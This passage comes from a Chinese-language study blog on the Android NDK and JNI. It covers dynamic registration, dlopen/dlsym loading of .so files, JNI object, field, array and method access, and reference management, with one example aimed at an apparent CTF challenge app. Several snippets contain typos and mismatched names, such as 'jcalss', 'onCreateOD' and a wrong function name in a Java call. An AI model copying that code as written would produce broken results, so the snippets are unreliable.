class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure><p>可以给<strong>同一个Java函数</strong>注册多个native函数，以最后一次为准 </p><p>一个简单的动态注册例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.java中调用和声明</span></span><br><span class="line">Log.d(<span class="string">&quot;zxk1ng&quot;</span>,encodeFromC(<span class="string">&quot;java&quot;</span>,<span class="number">100</span>,<span class="number">64412923.</span>getBytes()));</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI2</span><span class="params">(String a,<span class="type">int</span> b,<span class="type">byte</span>[] c)</span>;</span><br><span class="line"><span class="comment">//.cpp中</span></span><br><span class="line">jstring <span class="title function_">encodeFromC</span><span class="params">(JNIEnv *env,jobject,jstring,jint,jbyteArray)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">&quot;zxk1ng&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/example/ndk_demo/MainActivity&quot;</span>); JNINativeMethod methods[] = &#123; </span><br><span class="line">  <span class="comment">//public native String encode(int i,String str,byte[] byt); </span></span><br><span class="line">  &#123;<span class="string">&quot;stringFromJNI2&quot;</span>,<span class="string">&quot;(Ljava/lang/String;I[B)Ljava/lang/String;&quot;</span>, (<span class="keyword">void</span> *)encodeFromC&#125;, </span><br><span class="line">&#125;; </span><br><span class="line">env-&gt;RegisterNatives(MainActivityClazz,methods,sizeof(methods)/sizeof(JNINativeMethod)</span><br><span class="line"></span><br><span class="line"><span class="comment">//RegisterNatives结构如下：                    </span></span><br><span class="line">jint <span class="title function_">RegisterNatives</span><span class="params">(jclass clazz, const JNINativeMethod* methods,jint nMethods)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="多个cpp文件编译成一个so"><a href="#多个cpp文件编译成一个so" class="headerlink" title="多个cpp文件编译成一个so"></a>多个cpp文件编译成一个so</h2><p>只需要修改CMakeLists.txt<img src="2025-01-15-NDK学习/image-20240204191525854.png" alt="image-20240204191525854"></p><ul><li>两个cpp函数如何相互使用—在同一个so文件下<br>首先在一个cpp中声明函数，才能使用另一个cpp的函数。</li></ul><h2 id="编译多个so文件"><a href="#编译多个so文件" class="headerlink" title="编译多个so文件"></a>编译多个so文件</h2><p>多个so肯定对应多个cpp文件</p><p>编译多个so只需要添加如下：<br><img src="2025-01-15-NDK学习/image-20240204194227976.png" alt="image-20240204194227976"></p><p><img src="2025-01-15-NDK学习/image-20240204194330575.png" alt="image-20240204194330575">                                                     </p><h2 id="so路径的动态获取"><a href="#so路径的动态获取" class="headerlink" title="so路径的动态获取"></a>so路径的动态获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">&quot;zxk1ng&quot;</span>,getPath(getApplicationContext()));</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">(Context cxt)</span>&#123;</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">pm</span> <span class="operator">=</span> cxt.getPackageManager(); </span><br><span class="line">    List&lt;PackageInfo&gt; pkgList = pm.getInstalledPackages(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pkgList == <span class="literal">null</span> || pkgList.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span>(PackageInfo pi : pkgList)&#123;</span><br><span class="line">        <span class="keyword">if</span> (pi.applicationInfo.nativeLibraryDir.startsWith(<span class="string">&quot;/data/app/&quot;</span>) &amp;&amp; pi. packageName.startsWith(<span class="string">&quot;com.example.ndk_demo&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> pi.applicationInfo.nativeLibraryDir;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so之间的相互调用—dlopen-dlsym"><a href="#so之间的相互调用—dlopen-dlsym" class="headerlink" title="so之间的相互调用—dlopen dlsym"></a>so之间的相互调用—dlopen dlsym</h2><p>在获取到so路径前提下，使用dlopen加载加载这个so文件路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java文件中</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">       ......</span><br><span class="line">        String path=getPath(getApplicationContext())+<span class="string">&quot;/libxiaojianbangB.so&quot;</span>;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,getPath(getApplicationContext()));</span><br><span class="line">  ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">(String path)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">(Context cxt)</span>&#123;</span><br><span class="line">        <span class="type">PackageManager</span> <span class="variable">pm</span> <span class="operator">=</span> cxt.getPackageManager();</span><br><span class="line">        List&lt;PackageInfo&gt; pkgList = pm.getInstalledPackages(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(pkgList == <span class="literal">null</span> || pkgList.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span>(PackageInfo pi : pkgList)&#123;</span><br><span class="line">            <span class="keyword">if</span> (pi.applicationInfo.nativeLibraryDir.startsWith(<span class="string">&quot;/data/app/&quot;</span>) &amp;&amp; pi. packageName.startsWith(<span class="string">&quot;com.example.ndk_demo&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> pi.applicationInfo.nativeLibraryDir;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cpp文件中</span></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_example_ndk_1demo_MainActivity_stringFromJNI</span><span class="params">(</span></span><br><span class="line"><span class="params">        JNIEnv* env,</span></span><br><span class="line"><span class="params">        jobject <span class="comment">/* this */</span>,jstring path)</span> &#123;</span><br><span class="line">    std::<span class="type">string</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="string">&quot;Hello from C++&quot;</span>;</span><br><span class="line">    const <span class="type">char</span> *cPath = env-&gt;GetStringUTFChars(path,nullptr);</span><br><span class="line">    <span class="keyword">void</span> *soinfo = dlopen(cPath,RTLD_NOW );</span><br><span class="line">    <span class="keyword">void</span> (*ref)();   <span class="comment">//函数指针</span></span><br><span class="line">    ref=reinterpret_cast&lt;<span class="keyword">void</span> (*) () &gt;(dlsym(soinfo,<span class="string">&quot;fromSoB&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(ref==nullptr)&#123;</span><br><span class="line">        LOGD(<span class="string">&quot;ref if null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ref(); <span class="comment">//调用</span></span><br><span class="line">    dlclose(soinfo); <span class="comment">//关闭so</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());<span class="comment">//.c_str：c++字符串转化c字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so之间相互调用—不同so文件里的函数相互调用"><a href="#so之间相互调用—不同so文件里的函数相互调用" class="headerlink" title="so之间相互调用—不同so文件里的函数相互调用"></a>so之间相互调用—不同so文件里的函数相互调用</h2><p>CMakeLists做如下修改</p><p><img src="2025-01-15-NDK学习/image-20240204224426093.png" alt="image-20240204224426093"></p><p>说明libdemo.so文件中的函数将要在libndk_demo.so中被调用使用</p><h2 id="通过jni创建Java对象"><a href="#通过jni创建Java对象" class="headerlink" title="通过jni创建Java对象"></a>通过jni创建Java对象</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NewObject创建对象</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID = env-&gt;<span class="built_in">GetMethodID</span>(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj = env-&gt;<span class="built_in">NewObject</span>(clazz, methodID);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;ReflectDemoObj %p&quot;</span>, ReflectDemoObj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//AllocObject创建对象</span></span><br><span class="line">jclass clazz2 = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID2 = env-&gt;<span class="built_in">GetMethodID</span>(clazz2, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj2 = env-&gt;<span class="built_in">AllocObject</span>(clazz2);   <span class="comment">//相当于获取空间</span></span><br><span class="line">jstring jstr = env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;from jni str&quot;</span>);</span><br><span class="line">env-&gt;<span class="built_in">CallNonvirtualVoidMethod</span>(ReflectDemoObj2, clazz2, methodID2, jstr, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><h2 id="通过jni访问Java属性"><a href="#通过jni访问Java属性" class="headerlink" title="通过jni访问Java属性"></a>通过jni访问Java属性</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取静态字段</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jfieldID privateStaticStringField =</span><br><span class="line">            env-&gt;<span class="built_in">GetStaticFieldID</span>(clazz, <span class="string">&quot;privateStaticStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">jstring privateStaticString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetStaticObjectField</span>(clazz, privateStaticStringField));</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* privatecstr =</span><br><span class="line">            env-&gt;<span class="built_in">GetStringUTFChars</span>(privateStaticString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;privateStaticString: %s&quot;</span>, privatecstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(privateStaticString, privatecstr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取对象字段</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID = env-&gt;<span class="built_in">GetMethodID</span>(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj = env-&gt;<span class="built_in">NewObject</span>(clazz, methodID);</span><br><span class="line"></span><br><span class="line">jfieldID publicStringField =</span><br><span class="line">            env-&gt;<span class="built_in">GetFieldID</span>(clazz, <span class="string">&quot;publicStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">jstring publicString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, publicStringField));</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* publiccstr = env-&gt;<span class="built_in">GetStringUTFChars</span>(publicString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;publicStringField: %s&quot;</span>, publiccstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(publicString, publiccstr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置字段 先指定到这个字段，在设置</span></span><br><span class="line"> jfieldID privateStringFieldID =</span><br><span class="line">            env-&gt;<span class="built_in">GetFieldID</span>(clazz, <span class="string">&quot;privateStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line"></span><br><span class="line">jstring privateString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, privateStringFieldID));</span><br><span class="line"></span><br><span class="line">env-&gt;<span class="built_in">SetObjectField</span>(ReflectDemoObj, privateStringFieldID, env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;zxk1ng&quot;</span>));</span><br><span class="line">`</span><br><span class="line">privateString = <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, privateStringFieldID));</span><br><span class="line">privateCstr = env-&gt;<span class="built_in">GetStringUTFChars</span>(privateString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;privateStringField new: %s&quot;</span>, privateCstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(privateString, privateCstr);</span><br></pre></td></tr></table></figure><h2 id="通过jni访问数组"><a href="#通过jni访问数组" class="headerlink" title="通过jni访问数组"></a>通过jni访问数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取数组字段</span></span><br><span class="line"><span class="type">jfieldID</span> <span class="variable">byteArrayID</span> <span class="operator">=</span> env-&gt;GetFieldID(clazz, <span class="string">&quot;byteArray&quot;</span>, <span class="string">&quot;[B&quot;</span>);</span><br><span class="line"><span class="type">jbyteArray</span> <span class="variable">byteArray</span> <span class="operator">=</span> static_cast&lt;jbyteArray&gt;(env-&gt;GetObjectField(ReflectDemoObj, byteArrayID));</span><br><span class="line"><span class="type">int</span> <span class="variable">_byteArrayLength</span> <span class="operator">=</span> env-&gt;GetArrayLength(byteArray);  <span class="comment">//获取长度</span></span><br><span class="line">jbyte* CBytes = env-&gt;GetByteArrayElements(byteArray, nullptr);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _byteArrayLength; i++) &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;jbyteArray: %d&quot;</span>, CBytes[i]);</span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//修改数组字段</span></span><br><span class="line"><span class="type">char</span> javaByte[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">    javaByte[i] = static_cast&lt;<span class="type">char</span>&gt;(<span class="number">100</span> - i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const jbyte *java_array = reinterpret_cast&lt;const jbyte *&gt;(javaByte);</span><br><span class="line">env-&gt;SetByteArrayRegion(byteArray, <span class="number">0</span>, _byteArrayLength, java_array);</span><br><span class="line"></span><br><span class="line">byteArray = static_cast&lt;jbyteArray&gt;(env-&gt;GetObjectField(ReflectDemoObj, byteArrayID));</span><br><span class="line">_byteArrayLength = env-&gt;GetArrayLength(byteArray);</span><br><span class="line">jbyte* CBytes = env-&gt;GetByteArrayElements(byteArray, nullptr);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _byteArrayLength; i++) &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;jbyteArray: %d&quot;</span>, CBytes[i]);      </span><br><span class="line">&#125;</span><br><span class="line">env-&gt;ReleaseByteArrayElements(byteArray, CBytes, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="通过jni访问方法"><a href="#通过jni访问方法" class="headerlink" title="通过jni访问方法"></a>通过jni访问方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用静态方法</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">publicStaticFuncID</span> <span class="operator">=</span></span><br><span class="line">            env-&gt;GetStaticMethodID(clazz, <span class="string">&quot;publicStaticFunc&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line"> env-&gt;CallStaticVoidMethod(clazz, publicStaticFuncID);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用动态方法 先创建对象，然后：</span></span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateFuncID</span> <span class="operator">=</span></span><br><span class="line">            env-&gt;GetMethodID(clazz, <span class="string">&quot;privateFunc&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)Ljava/lang/String;&quot;</span>);</span><br><span class="line">    <span class="type">jstring</span> <span class="variable">str1</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;this is from JNI&quot;</span>);</span><br><span class="line">    <span class="type">jstring</span> <span class="variable">retval_jstring</span> <span class="operator">=</span> static_cast&lt;jstring&gt;(env-&gt;CallObjectMethod(ReflectDemoObj, privateFuncID, str1, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">    const <span class="type">char</span>* retval_cstr = env-&gt;GetStringUTFChars(retval_jstring, nullptr);</span><br><span class="line">    LOGD(<span class="string">&quot;privateStaticString: %s&quot;</span>, retval_cstr);</span><br><span class="line">    env-&gt;ReleaseStringUTFChars(retval_jstring, retval_cstr);</span><br></pre></td></tr></table></figure><p>2）CallVoidMethod与CallVoidMethodV的区别是：CallVoidMethod可以传入多个参数，CallVoidMethodV只能传入一个参数，要自己处理参数</p><p>CallVoidMethodA</p><p>jvalue相当于一个结构体，可以指定类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">jstring</span> <span class="variable">str2</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;this is from JNI2&quot;</span>);</span><br><span class="line">jvalue args[<span class="number">2</span>];</span><br><span class="line">args[<span class="number">0</span>].l = str2;  <span class="comment">//0号存入jobject类型数据</span></span><br><span class="line">args[<span class="number">1</span>].i = <span class="number">1000</span>;  <span class="comment">//1号存入int类型数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">jstring</span> <span class="variable">retval</span> <span class="operator">=</span> static_cast&lt;jstring&gt;(env-&gt;CallObjectMethodA(ReflectDemoObj, privateFuncID, args));</span><br><span class="line">const <span class="type">char</span>* cpp_retval = env-&gt;GetStringUTFChars(retval, nullptr);</span><br><span class="line">LOGD(<span class="string">&quot;cpp_retval: %s&quot;</span>, cpp_retval);</span><br><span class="line">env-&gt;ReleaseStringUTFChars(retval, cpp_retval);</span><br></pre></td></tr></table></figure><p>3）参数是数组String[] 返回值是数组int[]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// String strArr[] = new String[3];</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">StringClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line"><span class="type">jobjectArray</span> <span class="variable">StringArr</span> <span class="operator">=</span> env-&gt;NewObjectArray(<span class="number">3</span>, StringClazz, nullptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i = 0; i &lt; 3; i++)&#123;</span></span><br><span class="line"><span class="comment">//        strArr[i] = &quot;NDK&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line"><span class="type">jstring</span> <span class="variable">str3</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;NDK&quot;</span>);</span><br><span class="line">env-&gt;SetObjectArrayElement(StringArr, i, str3);</span><br><span class="line">    <span class="comment">//env-&gt;DeleteLocalRef(str3);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateStaticFuncID</span> <span class="operator">=</span> env-&gt;GetStaticMethodID(clazz, <span class="string">&quot;privateStaticFunc&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)[I&quot;</span>);</span><br><span class="line"><span class="type">jintArray</span> <span class="variable">intArr</span> <span class="operator">=</span> static_cast&lt;jintArray&gt;(env-&gt;CallStaticObjectMethod(clazz, privateStaticFuncID, StringArr));</span><br><span class="line"><span class="type">int</span> *cintArr = env-&gt;GetIntArrayElements(intArr, nullptr);</span><br><span class="line"> LOGD(<span class="string">&quot;cintArr[9]=%d&quot;</span>, cintArr[<span class="number">9</span>]);</span><br><span class="line">env-&gt;ReleaseIntArrayElements(intArr, cintArr, JNI_ABORT);</span><br></pre></td></tr></table></figure><p>当在NDK中调用java层一个函数：且函数格式为：void func(int [] data)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">jintArray</span> <span class="variable">jArray1</span> <span class="operator">=</span> env-&gt;NewIntArray(<span class="number">16</span>);</span><br><span class="line">jint fill[<span class="number">16</span>]=&#123;数据&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/hectf2024/ezandroid/CheckActivity&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">methodID</span> <span class="operator">=</span> env-&gt;GetMethodID(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line"><span class="type">jobject</span> <span class="variable">ReflectDemoObj</span> <span class="operator">=</span> env-&gt;NewObject(clazz, methodID);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateFuncID</span> <span class="operator">=</span></span><br><span class="line">        env-&gt;GetMethodID(clazz, <span class="string">&quot;func&quot;</span>, <span class="string">&quot;([I)Ljava/lang/String;&quot;</span>);</span><br><span class="line"></span><br><span class="line">env-&gt;SetIntArrayRegion(jArray1, <span class="number">0</span>, <span class="number">16</span>, fill1);</span><br><span class="line">(env-&gt;CallVoidMethod(ReflectDemoObj, privateFuncID, jArray1));</span><br></pre></td></tr></table></figure><h2 id="通过jni访问Java父类方法"><a href="#通过jni访问Java父类方法" class="headerlink" title="通过jni访问Java父类方法"></a>通过jni访问Java父类方法</h2><p>native实现onCreate中的 super.onCreate()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">extern <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT <span class="keyword">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_com_example_ndk_1demo_MainActivity_onCreate</span><span class="params">(JNIEnv *env, jobject thiz,</span></span><br><span class="line"><span class="params">                                                 jobject saved_instance_state)</span> &#123;</span><br><span class="line">    jcalss AppCompatActivityClazz=</span><br><span class="line">        env-&gt;FindClass(<span class="string">&quot;androidx/appcompat/app/AppCompatActivity&quot;</span>);</span><br><span class="line">    jmethodID onCreateID=</span><br><span class="line">        env-&gt;GetMethodID(AppCompatActivity,<span class="string">&quot;onCreate&quot;</span>,<span class="string">&quot;(Landroid/os/Bundle;)V&quot;</span>);</span><br><span class="line">    env-&gt;CallNonvirtualVoidMethod(thiz,AppCompatActivity,onCreateOD,saved_instance_state);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>1.局部引用</p><p>大多数的jni函数调用以后返回的结果都是局部引用。一个函数内部的局部引用的数量是有限的，当函数体内需要大量使用局部引用时，最好及时删除不用的局部引用，可以使用env-&gt;DeleteLocalRef来删除局部引用。</p><p>1.1局部引用相关其他函数</p><p>env-&gt;EnsureLocalCapacity(num)：判断是否有足够的局部引用可以使用，足够则返回0，需要大量使用局部引用时，手动删除太麻烦，可使用以下两个函数来批量管理局部引用</p><p>env-&gt;PushLocalFrame(num) </p><p>env-&gt;PopLocalFrame(nullptr)</p><p>2.全局引用</p><p>在 jni 开发中，需要跨函数使用变量时，直接定义全局变量是没用的需要使用以下两个方法，</p><p>env-&gt;NewGlobalRef</p><p>env-&gt;DeleteGlobalRef</p><p>3.弱全局引用</p><p>与全局引用基本相同，区别是弱全局引用有可能会被回收</p><p>env-&gt;NewWeakGlobalRef</p><p>env-&gt;DeleteWeakGlobalRef</p><h2 id="子线程中获取java类"><a href="#子线程中获取java类" class="headerlink" 